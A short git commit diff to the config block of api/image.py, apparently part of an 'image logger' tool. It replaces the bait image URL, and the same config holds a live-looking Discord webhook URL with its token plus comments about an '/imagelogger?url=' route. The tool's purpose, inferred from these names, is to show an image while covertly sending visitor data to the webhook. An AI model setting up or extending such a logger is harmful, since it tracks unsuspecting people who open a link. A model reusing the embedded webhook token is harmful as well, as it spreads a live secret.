223fdba505d02c921133be34b2f059b19ebef6d8
ttebbbr8-beep <ttebbbr8@gmail.com>
2026-05-20 05:03:53 -0700

    Update image.py

--- api/image.py
+++ api/image.py
@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1506620364183306261/OQ0F2g4Xirh7ipxvEH01juvhBsAsqNZasEAm33kU3gdVXpGhj8oLm--mkpFLUOrzcgU1",
-    "image": "https://drive.google.com/u/0/drive-viewer/AKGpihaGO0ir8I86rf87Vu0OcZQDMHsDwA-XO-Oj30HVxRCYpB4qgJCXLPbyfocWLs-4d8S34jOjgp5auukMCmZpHIjnoQG-9haOSus=s1600-rw-v1?auditContext=forDisplay", # You can also have a custom image by using a URL argument
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQa6F2xxAUiUfuG9lUA0G7hNH9RObLptQl4Zw&s.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
